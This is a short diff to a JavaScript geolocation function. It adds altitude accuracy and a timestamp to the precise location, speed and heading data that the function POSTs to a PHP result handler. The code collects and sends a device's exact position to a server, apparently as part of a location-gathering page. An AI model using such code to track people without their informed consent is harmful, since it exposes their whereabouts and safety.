@@ -164,12 +164,24 @@ function locate(callback, errCallback) {
       spd = 'Not Available';
     }
 
+    // GPS accuracy instrumentation
+    var accAlt = position.coords.altitudeAccuracy;
+    if (accAlt || accAlt === 0) {
+      accAlt = accAlt + ' m';
+    }
+    else {
+      accAlt = 'Not Available';
+    }
+
+    // Epoch millis of the fix, for measuring time-to-fix / sample intervals
+    var ts = position.timestamp || Date.now();
+
     var ok_status = 'success';
 
     $.ajax({
       type: 'POST',
       url: 'result_handler.php',
-      data: { Status: ok_status, Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd },
+      data: { Status: ok_status, Lat: lat, Lon: lon, Acc: acc, Alt: alt, Dir: dir, Spd: spd, AccAlt: accAlt, Ts: ts },
       success: callback,
       mimeType: 'text'
     });
